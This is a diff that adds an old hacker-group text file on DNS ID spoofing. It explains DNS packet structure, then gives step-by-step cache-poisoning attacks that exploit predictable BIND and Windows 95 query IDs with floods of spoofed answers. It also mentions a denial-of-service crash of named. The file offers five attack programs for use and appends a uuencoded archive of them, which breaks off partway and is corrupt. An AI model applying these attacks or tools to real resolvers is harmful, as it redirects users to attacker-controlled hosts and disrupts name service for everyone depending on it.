@@ -1,0 +1,896 @@
+
+                      ___      ______      _       _
+                    /     \   |   _   \   |  \   /  |
+                   |  / \  |  |  |  \  |  |   \_/   |
+                   | |___| |  |  |_ /  |  |   \_/   |
+..oO  THE          |  ---  |  |       /   |  |   |  |         CreW Oo..
+                   '''   '''   '''''''    ''''   ''''        
+                               presents
+
+                           DNS ID Hacking                    
+                         (and even more !!)
+                    with colors & in images ;))
+                    
+
+--[1]-- DNS ID Hacking Presentation
+
+w00w00!
+Hi people you might be wondering what DNS ID Hacking (or Spoofing) is.
+DNS ID Hacking isn't a usual way of hacking/spoofing such jizz
+or any-erect. This method is based on a vulnerability on DNS Protocol.
+More brutal, the DNS ID hack/spoof is very efficient is very strong
+because there is no generation of DNS daemons that escapes from it (even
+WinNT!).
+
+--[1.1]-- DNS Protocol mechanism explanation
+
+In the first step, you must know how the DNS works. I will only explain the
+most important facts of this protocol. In order to do that, we will follow
+the way of a DNS request packet from A to Z!
+
+1: the client (bla.bibi.com) sends a request of resolution of the domain
+"www.heike.com". To resolve the name, bla.bibi.com uses "dns.bibi.com" for
+DNS. Let's take a look at the following picture..
+
+/---------------------------------\
+| 111.1.2.123  =  bla.bibi.com    |
+| 111.1.2.222  =  dns.bibi.com    |
+| format:                         |
+| IP_ADDR:PORT->IP_ADDR:PORT      |
+| ex:                             |
+| 111.1.2.123:2999->111.1.2.222:53|
+\---------------------------------/
+...
+  gethosbyname("www.heike.com");
+...
+
+[bla.bibi.com]                             [dns.bibi.com] 
+111.1.2.123:1999 --->[?www.heike.com]------> 111.1.2.222:53
+
+Here we see our resolution name request from source port 1999 which is
+asking to dns on port 53.
+
+[note: DNS is always on port 53]
+
+Now that dns.bibi.com has received the resolution request from bla.bibi.com,
+dns.bibi.com will have to resolve the name, let's look at it...
+
+[dns.bibi.com]                         [ns.internic.net]
+111.1.2.222:53 -------->[dns?www.heike.com]----> 198.41.0.4:53
+
+dns.bibi.com asks ns.internic.net who the root name server for the address
+of www.heike.com is, and if it doesn't have it and sends the request to a
+name server which has authority on '.com' domains.
+
+[note: we ask to internic because it could have this request in its cache]
+
+[ns.internic.net]                                      [ns.bibi.com]
+198.41.0.4:53 ------>[ns for.com is 144.44.44.4]------> 111.1.2.222:53
+
+Here we can see that ns.internic.net answered to ns.bibi.com (which is the
+DNS that has authority over the domain bibi.com), that the name server
+of for.com has the IP 144.44.44.4 [let's call it ns.for.com]. Now our 
+ns.bibi.com will ask to ns.for.com for the address of www.heike.com, 
+but this one doesn't have it and will forward the request to the DNS of
+heike.com which has authority for heike.com.
+
+[ns.bibi.com]                              [ns.for.com]
+111.1.2.222:53 ------>[?www.heike.com]-----> 144.44.44.4:53
+
+answer from ns.for.com
+
+[ns.for.com]                                              [ns.bibi.com]
+144.44.44.4:53 ------>[ns for heike.com is 31.33.7.4]---> 144.44.44.4:53
+
+Now that we know which IP address has authority on the domain "heike.com"
+[we'll call it ns.heike.com], we ask it what's the IP of the machine www
+[www.heike.com then :)].
+
+[ns.bibi.com]                              [ns.heike.com]
+111.1.2.222:53 ----->[?www.heike.com]----> 31.33.7.4:53
+
+And now we at least have our answer!!
+
+[ns.heike.com]                                           [ns.bibi.com]
+31.33.7.4:53 ------->[www.heike.com == 31.33.7.44] ----> 111.1.2.222:53
+
+Great we have the answer, we can forward it to our client bla.bibi.com.
+
+[ns.bibi.com]                                             [bla.bibi.com]
+111.1.2.222:53 ------->[www.heike.com == 31.33.7.44]----> 111.1.2.123:1999
+
+Hehe now bla.bibi.com knows the IP of www.heike.com :)
+
+So.. now let's imagine that we'd like to have the name of a machine from its
+IP, in order to do that, the way to proceed will be a little different
+because the IP will have to be transformed:
+
+example: 
+100.20.40.3 will become 3.40.20.100.in-addr.arpa
+
+Attention!! This method is only for the IP resolution request (reverse DNS)
+
+So let's look in practical when we take the IP of www.heike.com (31.33.7.44
+or "44.7.33.31.in-addr.arpa" after the translation into a comprehensible
+format by DNS).
+
+...
+   gethostbyaddr("31.33.7.44");
+...
+
+[bla.bibi.com]                                          [ns.bibi.com]
+111.1.2.123:2600 ----->[?44.7.33.31.in-addr.arpa]-----> 111.1.2.222:53
+
+We sent our request to ns.bibi.com
+
+[ns.bibi.com]                                          [ns.internic.net]
+111.1.2.222:53 ----->[?44.7.33.31.in-addr.arpa]------> 198.41.0.4:53 
+
+ns.internic.net will send the IP of a name server which has authority on
+'31.in-addr.arpa'.
+
+[ns.internic.net]                                             [ns.bibi.com]
+198.41.0.4:53 --> [DNS for 31.in-addr.arpa is 144.44.44.4] -> 111.1.2.222:53
+
+Now ns.bibi.com will ask the same question to the DNS at 144.44.44.4.
+
+[ns.bibi.com]                                          [ns.for.com]
+111.1.2.222:53 ----->[?44.7.33.31.in-addr.arpa]------> 144.44.44.4:53
+
+and so on...
+In fact the mechanism is nearly the same that was used for name
+resolution.
+
+I hope you understood the dialog on how DNS works. Now let's study DNS
+messages format.
+
+--[1.2]-- DNS packet 
+
+Here is the format of a DNS message :
+    +---------------------------+---------------------------+
+    |     ID (the famous :)     |  flags                    |
+    +---------------------------+---------------------------+
+    |   numbers of questions    | numbers of answer         |
+    +---------------------------+---------------------------+
+    | number of RR authority  |number of supplementary RR |
+    +---------------------------+---------------------------+
+    |                                                       |
+    \                                                       \
+    \                   QUESTION                            \
+    |                                                       |
+    +-------------------------------------------------------+
+    |                                                       |
+    \                                                       \
+    \                    ANSWER                             \
+    |                                                       |
+    +-------------------------------------------------------+
+    |                                                       |
+    \                                                       \
+    \                  Stuff  etc..    No matter            \
+    |                                                       |
+    +-------------------------------------------------------+
+
+--[1.3]--  Structure of DNS packets.
+
+
+__ID__
+
+The ID permits to identify each DNS packet, since exchanges between name
+servers are from port 53 to port 53, and more it might be more than one
+request at a time, so the ID is the only way to recognize the different DNS
+requests. Well talk about it later..
+
+__flags__
+
+The flags area is divided into several parts :
+
+       4 bits                    3 bits (always 0)
+       |                         |
+       |                         |
+[QR | opcode | AA| TC| RD| RA | zero | rcode ]
+                                         |
+ |           |__|__|__|                  |______ 4 bits
+ |                    |_ 1 bit
+ |
+1 bit
+
+QR     = If the QR bit = 0, it means that the packet is a question,
+         otherwise it's an answer.
+
+opcode = If the value is 0 for a normal request, 1 for a reserve request,
+         and 2 for a status request (we don't need to know all these modes).
+
+AA     = If it's equal to 1, it says that the name server has an
+         authoritative answer.
+
+TC     = No matter
+
+RD     = If this flag is to 1, it means "Recursion Request", for example
+         when bla.bibi.com asks ns.bibi.com to resolve the name, the flag
+         tells the DNS to assume this request.
+
+RA     = If it's set to 1, it means that recursion is available.
+         This bit is set to 1 in the answer of the name server if it
+         supports recursion.
+
+Zero   = Here are three zeroes...
+
+rcode  = It contains the return error messages for DNS requests
+         if 0, it means "no error", 3 means "name error"
+
+The 2 following flags don't have any importance for us.
+
+DNS QUESTION:
+
+Here is the format of a DNS question :
+
++-----------------------------------------------------------------------+
+|                        name of the question                           |
++-----------------------------------------------------------------------+
+|       type of question         |      type of query                   |
++--------------------------------+--------------------------------------+
+
+The structure of the question is like this.
+
+example:
+www.heike.com  will be [3|w|w|w|5|h|e|i|k|e|3|c|o|m|0] 
+for an IP address it's the same thing :)
+
+44.33.88.123.in-addr.arpa would be:
+[2|4|4|2|3|3|2|8|8|3|1|2|3|7|i|n|-|a|d|d|r|4|a|r|p|a|0]
+[note]: a compression format exists, but we won't use it.
+
+
+type of question:
+
+ Here are the values that we will use most times:
+ [note]: There are more than 20 types of different values(!) and I'm fed
+         up with writing :))
+
+  name    value
+   A    |   1    | IP Address          ( resolving a name to an IP )
+   PTR  |   12   | Pointer             ( resolving an IP to a name )
+
+
+type of query:
+
+ The values are the same than the type of question
+ (i don't know if it's true, but the goal is not to learn you DNS protocol
+ from A to Z, for it you should look at the RFC from 1033 to 1035 and 1037,
+ here the goal is a global knowledge in order to put it in practice !!)
+
+
+
+DNS ANSWER:
+
+The answers have a format that we call RR.. but we don't mind :)
+
+Here is the format of an answer (an RR)
+
++------------------------------------------------------------------------+
+|      name of the domain                                                |
++------------------------------------------------------------------------+
+|   type                           |    class                            |
++----------------------------------+-------------------------------------+
+|                           TTL (time to live)                           |
++------------------------------------------------------------------------+
+| resource data length       |                                           |
+|----------------------------+                                           |
+|                       resource data                                    |
++-------------------------------------------------------------------------
+
+name of the domain:
+
+The name of the domain in reports to the following resource:
+The domain name is stored in the same way that the part question for the
+resolution request of www.heike.com, the flag "name of the domain" will
+contain [3|w|w|w|5|h|e|i|k|e|3|c|o|m|0]
+
+type:
+
+The type flag is the same than "type of query" in the question part of the
+packet.
+
+class:
+The class flag is equal to 1 for Internet data.
+
+time to live:
+This flag explains in seconds the time-life of the informations into the
+name server cache.
+
+resource data length: 
+The length of resource data, for example if resource data length is 4, it
+means that the data in resources data are 4 bytes long.
+
+resource data:  
+here we put the IP for example (at least in our case)
+
+I will offer you a little example that explains this better:
+
+Here is what's happening when ns.bibi.com asks ns.heike.com for 
+www.heike.com's address
+
+ns.bibi.com:53 ---> [?www.heike.com] ----> ns.heike.com:53 (Phear Heike ;)
+
++---------------------------------+--------------------------------------+
+|   ID = 1999                     | QR = 0 opcode = 0 RD = 1             |
++---------------------------------+--------------------------------------+
+| numbers of questions = htons(1) | numbers of answers = 0               |
++---------------------------------+--------------------------------------+
+| number of RR authoritative = 0  | number of supplementary RR = 0       |
++---------------------------------+--------------------------------------+
+<the question part>
++------------------------------------------------------------------------+
+|   name  of the question = [3|w|w|w|5|h|e|i|k|e|3|c|o|m|0]              |
++------------------------------------------------------------------------+
+|  type of question = htons(1)    |      type of query=htons(1)          |
++---------------------------------+--------------------------------------+
+
+here is for the question.
+
+now let's stare the answer of ns.heike.com
+
+ns.heike.com:53 -->[IP of www.heike.com is 31.33.7.44] --> ns.bibi.com:53
+
++---------------------------------+---------------------------------------+
+|   ID = 1999                     | QR=1 opcode=0 RD=1  AA =1  RA=1       |
++---------------------------------+---------------------------------------+
+| numbers of questions = htons(1) | numbers of answers = htons(1)         |
++---------------------------------+---------------------------------------+
+| number of RR authoritative = 0  | number of supplementary RR = 0        |
++---------------------------------+---------------------------------------+
++-------------------------------------------------------------------------+
+|   name  of the question = [3|w|w|w|5|h|e|i|k|e|3|c|o|m|0]               |
++-------------------------------------------------------------------------+
+|   type of question = htons(1)   |      type of query = htons(1)         |
++-------------------------------------------------------------------------+
++-------------------------------------------------------------------------+
+|   name of the domain = [3|w|w|w|5|h|e|i|k|e|3|c|o|m|0]                  |
++-------------------------------------------------------------------------+
+|       type        = htons(1)    |      class    = htons(1)              |
++-------------------------------------------------------------------------+
+|                       time to live = 999999                             |
++-------------------------------------------------------------------------+
+| resource data length = htons(4) | resource data=inet_addr("31.33.7.44") |
++-------------------------------------------------------------------------+
+
+Yah! That's all for now :))
+ 
+Here is an analysis:
+In the answer QR = 1 because it's an answer :)
+AA = 1 because the name server has authority in its domain
+RA = 1 because recursion is available
+
+Good =) I hope you understood that cause you will need it for the following
+events.
+
+--[2.0]-- DNS ID hack/spoof
+
+Now it's time to explain clearly what DNS ID hacking/spoofing is.
+Like I explained before, the only way for the DNS daemon to recognize
+the different questions/answers is the ID flag in the packet. Look at this
+example:
+
+ns.bibi.com;53 ----->[?www.heike.com] ------> ns.heike.com:53
+
+So you only have to spoof the ip of ns.heike.com and answer your false
+information before ns.heike.com to ns.bibi.com!
+
+ns.bibi.com <------- . . . . . . . . . . .  ns.heike.com 
+                   |
+                   |<--[IP for www.heike.com is 1.2.3.4]<-- hum.roxor.com 
+
+But in practice you have to guess the good ID :) If you are on a LAN, you
+can sniff to get this ID and answer before the name server (it's easy on a
+Local Network :)
+
+If you want to do this remotely you don't have a lot a choices, you only
+have 4 basics methods:
+
+1.) Randomly test all the possible values of the ID flag. You must answer
+    before the ns ! (ns.heike.com in this example). This method is obsolete
+    unless you want to know the ID .. or any other favorable condition to
+    its prediction.
+
+2.) Send some DNS requests (200 or 300) in order to increase the chances
+    of falling on the good ID.
+
+3.) Flood the DNS in order to avoid its work. The name server will crash
+    and show the following error!
+
+    >> Oct 06 05:18:12 ADM named[1913]: db_free: DB_F_ACTIVE set - ABORT
+       at this time named daemon is out of order :)
+
+4.) Or you can use the vulnerability in BIND discovered by SNI (Secure
+    Networks, Inc.) with ID prediction (we will discuss this in a bit).  
+
+
+##################### Windows ID Vulnerability ###########################
+
+I found a heavy vulnerability in Windows 95 (I haven't tested it on
+WinNT), lets imagine my little friend that's on Windows 95.
+Windows ID's are extremely easy to predict because it's "1" by default :))) 
+and "2" for the second question (if they are 2 questions at the same time).
+
+
+######################## BIND Vulnerability ##############################
+
+There is a vulnerability in BIND (discovered by SNI as stated earlier).
+In fact, DNS IS are easily predictable, you only have to sniff a DNS in
+order to do what you want. Let me explain...
+
+The DNS uses a random ID at the beginning but it only increase this ID for
+next questions ... =)))
+
+It's easy to exploit this vulnerability.
+Here is the way:
+
+1. Be able to sniff easily the messages that comes to a random DNS (ex.
+   ns.dede.com for this sample).
+
+2. You ask NS.victim.com to resolve (random).dede.com. NS.victim.com will
+   ask to ns.dede.com to resolve (random).dede.com
+
+   ns.victim.com ---> [?(rand).dede.com ID = 444] ---> ns.dede.com
+
+3. Now you have the ID of the message from NS.victim.com, now you know what
+   ID area you'll have to use. (ID = 444 in this sample).
+
+4. You then make your resolution request. ex. www.microsoft.com to
+   NS.victim.com
+   
+   (you) ---> [?www.microsoft.com] ---> ns.victim.com
+
+   ns.victim.com --> [?www.microsoft.com ID = 446 ] --> ns.microsoft.com
+     
+5. Flood the name server ns.victim.com with the ID (444) you already have and
+   then you increase this one.
+
+ ns.microsoft.com --> [www.microsoft.com = 1.1.1.1 ID = 444] --> ns.victim.com
+ ns.microsoft.com --> [www.microsoft.com = 1.1.1.1 ID = 445] --> ns.victim.com
+ ns.microsoft.com --> [www.microsoft.com = 1.1.1.1 ID = 446] --> ns.victim.com
+ ns.microsoft.com --> [www.microsoft.com = 1.1.1.1 ID = 447] --> ns.victim.com
+ ns.microsoft.com --> [www.microsoft.com = 1.1.1.1 ID = 448] --> ns.victim.com
+ ns.microsoft.com --> [www.microsoft.com = 1.1.1.1 ID = 449] --> ns.victim.com
+
+
+(now you know that DNS IDs are predictable, and they only increase. You
+flood ns.victim.com with spoofed answers with the ID 444+ ;)
+
+*** ADMsnOOfID does this.
+
+
+There is another way to exploit this vulnerability without a root on
+any DNS
+
+The mechanism is very simple. Here is the explaination
+
+We send to ns.victim.com a resolution request for *.provnet.fr
+
+(you) ----------[?(random).provnet.fr] -------> ns.victim.com
+
+Then, ns.victim.com asks ns1.provnet.fr to resolve (random).provnet.fr.
+There is nothing new here, but the interesting part begins here.
+
+From this point you begin to flood ns.victim.com with spoofed answers
+(with ns1.provnet.fr IP) with ids from 100 to 110...
+
+(spoof) ----[(random).provnet.fr is 1.2.3.4 ID=100] --> ns.victim.com 
+(spoof) ----[(random).provnet.fr is 1.2.3.4 ID=101] --> ns.victim.com 
+(spoof) ----[(random).provnet.fr is 1.2.3.4 ID=102] --> ns.victim.com 
+(spoof) ----[(random).provnet.fr is 1.2.3.4 ID=103] --> ns.victim.com 
+.....
+
+After that, we ask ns.victim.com if (random).provnet.fr has an IP.
+
+If ns.victim.com give us an IP for (random).provnet.fr then we have
+found the correct ID :) Otherwise we have to repeat this attack until we
+find the ID. It's a bit long but it's effective. And nothing forbides you 
+to do this with friends ;)
+
+This is how ADMnOg00d works ;)
+
+-------------------------------
+
+
+
+########################################################################## 
+
+Here you will find 5 programs
+ADMkillDNS  - very simple DNS spoofer
+ADMsniffID  - sniff a LAN and reply false DNS answers before the NS
+ADMsnOOfID  - a DNS ID spoofer (you'll need to be root on a NS)
+ADMnOg00d   - a DNS ID predictor (no need to be root on a NS)
+ADNdnsfuckr - a very simple denial of service attack to disable DNS
+
+Have fun!! :)
+Note: You can find source and binaries of this progs at 
+ftp.janova.org/pub/ADM. I'm going to make a little HOWTO soon, which would
+be on janova. You need to install libpcap on your machine before any
+compilation of the ADMID proggies :)
+
+
+ADM Crew.
+
+Thanks to: all ADM crew, Shok, pirus, fyber, Heike, and w00w00 (gotta love
+these guys)
+Special Thanks: ackboo, and of course Secure Networks, Inc. (SNI) at
+www.secnet.com for finding the vulnerability =)   
+
+/* I'm a w00w00ify'd w00c0w */
+/* I'm a w00w00ify'd w00c0w */
+/* I'm a w00w00ify'd w00c0w */
+
+
+
+begin 644 ADMid-pkg.tgz
+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
